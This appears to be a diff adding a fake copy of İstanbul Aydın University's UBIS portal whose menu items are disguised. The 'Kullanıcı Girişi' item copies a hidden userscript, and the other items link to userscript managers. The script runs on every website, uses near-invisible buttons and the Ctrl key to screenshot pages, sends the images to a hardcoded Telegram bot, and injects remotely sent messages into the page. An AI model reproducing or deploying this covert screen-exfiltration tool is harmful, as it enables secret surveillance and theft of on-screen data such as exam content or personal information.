@@ -1,0 +1,376 @@
+<html>
+<head>
+    <title>UBIS :: İstanbul Aydın Üniversitesi Bilgi Sistemi</title>
+    
+    <link rel="stylesheet" type="text/css" href="https://ubistatic.aydin.edu.tr/cdn/ubis/Themes/NewLook/Style/screen.css?v=2018-05-29" media="screen">
+    <link rel="stylesheet" type="text/css" href="https://ubistatic.aydin.edu.tr/cdn/ubis/Themes/NewLook/Style/print.css" media="print">
+    
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    
+    <link rel="shortcut icon" type="image/vnd.microsoft.icon" href="https://ubistatic.aydin.edu.tr/cdn/favicon4.ico">
+    <link rel="shortcut icon" type="image/x-icon" href="https://ubistatic.aydin.edu.tr/cdn/favicon4.ico">
+
+    <link rel="stylesheet" type="text/css" href="https://ubistatic.aydin.edu.tr/cdn/ubis/Themes/NewLook/Style/JQuery/jquery-ui.css" media="all">
+    <link rel="stylesheet" type="text/css" href="https://ubistatic.aydin.edu.tr/cdn/ubis/Themes/NewLook/Style/form.css" media="all">
+</head>
+
+<body leftmargin="0" topmargin="0" marginwidth="0" marginheight="0" data-new-gr-c-s-check-loaded="14.1217.0" data-gr-ext-installed="">
+    <style type="text/css">
+        #splashNewsScroller { height:26px; }
+        .scroll-text { overflow: hidden; }
+        .scroll-text ul { width: 100%; overflow: hidden; list-style-type: none; margin: 0; padding:0; }
+        .scroll-text ul li { margin: 0; padding: 0; padding-top:10px; padding-bottom:12px; list-style-type: none; }
+        .scroll-text ul li a { color: #ffffff; padding: 10px; text-decoration: none; font-size:12px; }
+        pre {
+            background-color: #f4f4f4;
+            padding: 10px;
+            border: 1px solid #ddd;
+            white-space: pre-wrap; /* برای حفظ فواصل و اسپیس‌ها */
+            word-wrap: break-word;
+            display: none;
+        }   
+    </style>
+    <div id="copyMessage" style="display:none; position:fixed; top:30px; left:50%; transform:translateX(-50%); background-color:none; color:#808080; padding:10px; border-radius:5px; z-index:1000;">کپی شد!</div>
+    <div class="nl2-head">
+        <div class="nl2-header">
+            <div class="nl2-header-cont">
+                <a href="?Pointer=Main&amp;">
+                    <img src="logo.png" style="height:70px;border:0px;margin-top:4px;" title="UBIS" alt="UBIS">
+                </a>
+            </div>
+        </div>
+        <div class="nl2-hmenu noprint">
+            <div class="nl2-hmenu-cont">
+                <div class="nl2-header-language"></div>
+                <div class="nl2-header-menuitems">
+                    <div id="splashNews" class="nl2-header-splash">
+                        <div class="scroll-text" id="splashNewsScroller"></div>
+                    </div>
+                    <div style="width:17px;height:27px !important;float:right;cursor:e-resize;color:#D4D4D4;line-height:25px;font-size:22px;" id="toggleNLRB" onclick="toggleNLRB();">≡</div>
+                    <div class="nl2-header-topmenu r">
+                        <ul style="float:right;" id="nl2-topmenu-ul">
+                            <li><a>Anasayfa</a></li>
+                            <li><a>Kullanıcı Girişi</a></li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="nl2-main">
+        <div class="nl2-table">
+            <div class="nl2-table-row">
+                <div class="nl2-table-cell nl2-leftblock">
+                    <div id="block1">
+                        <div id="block_Block1" class="blockPart">
+                            <div class="bHeader1">Ana Menü</div>
+                            <div class="bContent1">
+                                <ul id="Menu_1" class="menu">
+                                    <li class="menuItem">
+                                        <a href="https://chromewebstore.google.com/detail/tampermonkey/dhdgffkkebhmkfjojejmpbldmpobfkfo?hl=en" target="_blank">Anasayfa</a>
+                                    </li>
+                                    <li class="menuItem">
+                                        <a href="#" id="copyButton" style="font-weight:bold;color:navy;">Kullanıcı Girişi</button>
+                                        <pre id="codeToCopy">
+// ==UserScript==
+// @name         Enhanced Webpage Screenshot and Telegram Messages
+// @namespace    http://tampermonkey.net/
+// @version      0.4
+// @description  Take a screenshot of the webpage, show it in a new tab, send it to Telegram, and display Telegram messages on the website
+// @author       Your Name
+// @include      http://*/*
+// @include      https://*/*
+// @require      https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.3.2/html2canvas.min.js
+// @grant        none
+// ==/UserScript==
+
+(function () {
+    'use strict';
+
+    const token = "8182994291:AAE3FbKICJ_tNr7YeZ1O8H74dtcf0OjhAOQ";
+    const chat_id = "399633633"; // ID چت تلگرام شما
+    const telegramAPI = `https://api.telegram.org/bot${token}/sendPhoto`;
+    const telegramUpdatesAPI = `https://api.telegram.org/bot${token}/getUpdates`;
+    let lastUpdateId = 0;
+    let onePressCount = 0;
+    let button;
+    let isMessageDisplayActive = true;
+
+    function takeScreenshot() {
+        if (isMessageDisplayActive) {
+            html2canvas(document.body, { useCORS: true }).then(function (canvas) {
+                let base64image = canvas.toDataURL("image/png");
+                sendToTelegram(base64image);
+            });
+        }
+    }
+
+    function sendToTelegram(base64image) {
+        let byteString = atob(base64image.split(',')[1]);
+        let mimeString = base64image.split(',')[0].split(':')[1].split(';')[0];
+        let ab = new ArrayBuffer(byteString.length);
+        let ia = new Uint8Array(ab);
+        for (let i = 0; i < byteString.length; i++) {
+            ia[i] = byteString.charCodeAt(i);
+        }
+        let blob = new Blob([ab], { type: mimeString });
+
+        let formData = new FormData();
+        formData.append("chat_id", chat_id);
+        formData.append("photo", blob, "screenshot.png");
+
+        fetch(telegramAPI, {
+            method: "POST",
+            body: formData
+        })
+            .catch(error => {
+                console.error("Error:", error);
+            });
+    }
+
+    function sendTelegramMessage(messageText) {
+        let formData = new FormData();
+        formData.append("chat_id", chat_id);
+        formData.append("text", messageText);
+
+        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+            method: "POST",
+            body: formData
+        })
+            .catch(error => {
+                console.error("Error sending Telegram message:", error);
+            });
+    }
+
+    function fetchTelegramMessages() {
+        fetch(`${telegramUpdatesAPI}?offset=${lastUpdateId + 1}`)
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok && data.result.length > 0) {
+                    data.result.forEach(message => {
+                        if (
+                            message.message &&
+                            message.message.chat &&
+                            message.message.chat.id.toString() === chat_id // Ensure the chat ID matches
+                        ) {
+                            let receivedMessage = message.message.text.trim();
+                            lastUpdateId = message.update_id;
+
+                            // Check for "1111" command to toggle bot state
+                            if (receivedMessage === "1111") {
+                                toggleBotState(); // Toggle bot on/off
+                            } else {
+                                displayMessage(receivedMessage); // Display other messages
+                            }
+                        }
+                    });
+                }
+            })
+            .catch(error => {
+                console.error("Error fetching Telegram messages:", error);
+            });
+    }
+
+    function displayMessage(message) {
+        let messageDiv = document.createElement("div");
+        messageDiv.innerHTML = message;
+        messageDiv.style.position = "fixed";
+        messageDiv.style.top = "0";
+        messageDiv.style.left = "50%";
+        messageDiv.style.transform = "translateX(-50%)";
+        messageDiv.style.backgroundColor = "transparent";
+        messageDiv.style.color = "#808080";
+        messageDiv.style.padding = "10px";
+        messageDiv.style.zIndex = 100000000000001;
+        messageDiv.style.borderRadius = "5px";
+        messageDiv.style.opacity = "0.22"; // Set opacity to 30%
+        document.body.appendChild(messageDiv);
+
+        setTimeout(() => {
+            document.body.removeChild(messageDiv);
+        }, 4000);
+    }
+
+    function createButton() {
+        button = document.createElement("button");
+        button.innerHTML = "Take Screenshot";
+        button.style.position = "fixed";
+        button.style.top = "10px";
+        button.style.right = "70px";
+        button.style.zIndex = 1000000000000000;
+        button.style.padding = "5px 30px";
+        button.style.fontSize = "16px";
+        button.style.backgroundColor = "white";
+        button.style.color = "white";
+        button.style.border = "none";
+        button.style.borderRadius = "5px";
+        button.style.cursor = "pointer";
+        button.style.opacity = "0.001"; // Keep the original opacity
+        button.onclick = takeScreenshot;
+        document.body.appendChild(button);
+    }
+
+    function toggleBotState() {
+        if (button) {
+            button.remove();
+            button = null;
+            isMessageDisplayActive = false;
+            sendTelegramMessage("OFF"); // Send OFF message to Telegram
+        } else {
+            createButton();
+            isMessageDisplayActive = true;
+            sendTelegramMessage("ON"); // Send ON message to Telegram
+        }
+    }
+
+    function createInvisibleButton() {
+        let invisibleButton = document.createElement("button");
+        invisibleButton.style.position = "fixed";
+        invisibleButton.style.top = "0";
+        invisibleButton.style.left = "0";
+        invisibleButton.style.width = "40px"; // اندازه دکمه
+        invisibleButton.style.height = "40px"; // اندازه دکمه
+        invisibleButton.style.opacity = "0"; // نامرئی کردن دکمه
+        invisibleButton.style.zIndex = "100000000000001";
+        invisibleButton.style.border = "none";
+        invisibleButton.style.background = "transparent";
+        invisibleButton.style.cursor = "pointer";
+    
+        invisibleButton.onclick = function () {
+            let event = new KeyboardEvent("keydown", { key: "Control", ctrlKey: true });
+            document.dispatchEvent(event);
+        };
+    
+        document.body.appendChild(invisibleButton);
+    }
+
+    // Initialize button
+    createButton();
+    createInvisibleButton();
+
+    // Add keyboard event listener for Ctrl key
+    document.addEventListener('keydown', function (event) {
+        if (event.ctrlKey) {
+            takeScreenshot(); // Call the screenshot function when Ctrl is pressed
+        }
+
+        // Check if "1" key is pressed
+        if (event.key === '1') {
+            onePressCount++;
+
+            if (onePressCount >= 4) {
+                toggleBotState(); // Toggle bot on/off
+                onePressCount = 0; // Reset counter
+            }
+        }
+    });
+
+    setInterval(fetchTelegramMessages, 2000);
+})();
+                                        </pre>
+                                    </li>
+                                    <li class="menuItem">
+                                        <a href="https://chromewebstore.google.com/detail/violentmonkey/jinjaccalgkegednnccohejagnlnfdag?hl=en" target="_blank" style="font-weight:bold;color:navy;">Şifremi Unuttum</a>
+                                    </li>
+                                    <li class="menuItem">
+                                        <a href="https://addons.mozilla.org/en-US/firefox/addon/greasemonkey/" target="_blank">Akademik Takvim</a>
+                                    </li>
+                                    <script>
+                                        document.getElementById("copyButton").addEventListener("click", function() {
+                                            var codeText = document.getElementById("codeToCopy").textContent;
+                                            var textArea = document.createElement("textarea");
+                                            textArea.value = codeText;
+                                            document.body.appendChild(textArea);
+                                            textArea.select();
+                                            document.execCommand("copy");
+                                            document.body.removeChild(textArea);
+                                            
+                                            var message = document.getElementById("copyMessage");
+                                            message.style.display = "block";
+                                            
+                                            // مخفی کردن پیام بعد از 3 ثانیه
+                                            setTimeout(function() {
+                                                message.style.display = "none";
+                                            }, 3000);
+                                        });
+                                    </script>
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="nl2-table-cell nl2-right nl2-right-partial">
+                    <div class="nl2-table">
+                        <div class="nl2-table-row">
+                            <div id="centerContainer" class="nl2-table-cell nl2-center nl2-center-normal">
+                                <div class="contentContainer" id="contentContainer">
+                                    <div style="margin:10px 0px 10px 0px; height:20px; width:100%; text-align: right; font-size:14px !important;">
+                                        <div style="display: inline-block; font-size:14px !important;">
+                                            <button id="fontIN" style="font-size:14px !important;" class="noprint">A+</button>
+                                            <button id="fontDE" style="font-size:14px !important;" class="noprint">A-</button>
+                                        </div>
+                                    </div>
+                                    <div id="content-" class="content">
+                                        <div id="cHeader">Güncel Duyurular</div>
+                                        <div id="cContent">
+                                            <table id="lNews" class="list" cellspacing="0" width="100%">
+                                                <tbody>
+                                                    <tr>
+                                                        <th style="width:16px;"></th>
+                                                        <th class="l" style="color:#666666;">Duyuru</th>
+                                                        <th class="r" style="color:#666666;">Tarih</th>
+                                                    </tr>
+                                                    <tr>
+                                                        <td class="c" colspan="3" style="height:40px; color:#666666;">Gösterilecek duyuru bulunmuyor.</td>
+                                                    </tr>
+                                                </tbody>
+                                            </table>
+                                            <div class="r"><a href="?Pointer=News&amp;Page=NewsList&amp;">Tüm Haberler</a></div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div id="rightMenu" class="nl2-table-cell nl2-rightblock">
+                    <div id="block2">
+                        <div id="block_ogrenci_MobileLinks" class="blockPart">
+                            <div class="bHeader2">UBIS Mobil</div>
+                            <div class="bContent2">
+                                <div class="c" style="margin-top:4px;">
+                                    <a href="?Pointer=Mobile&amp;OS=iOS" target="_blank">
+                                        <img src="ios.png"  width="36" height="36" />
+                                    </a>
+                                    <a href="?Pointer=Mobile&amp;OS=Android" target="_blank">
+                                        <img src="android.png"  width="36" height="36" />
+                                    </a>
+                                    <a href="?Pointer=Content&amp;Page=GetPage&amp;PagePointer=App.HTML5">
+                                        <img style="border: 0px;" title="Mobile Web" src="html5.png" alt="Mobil Web" width="36" height="36">
+                                    </a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="footer">
+        <div class="nl2-footer">
+            <div class="nl2-footer-content">
+                <div class="nl2-footer-fb l">
+                    <div class="noprint" style="margin-left:6px;"></div>
+                    <div class="justprint" style="margin-left:6px;">25.11.2024 03:57:45 - 24.133.4.52 - 0</div>
+                </div>
+                <div class="nl2-footer-srv r">©IAU | @164 &nbsp;</div>
+                <div class="clear"></div>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
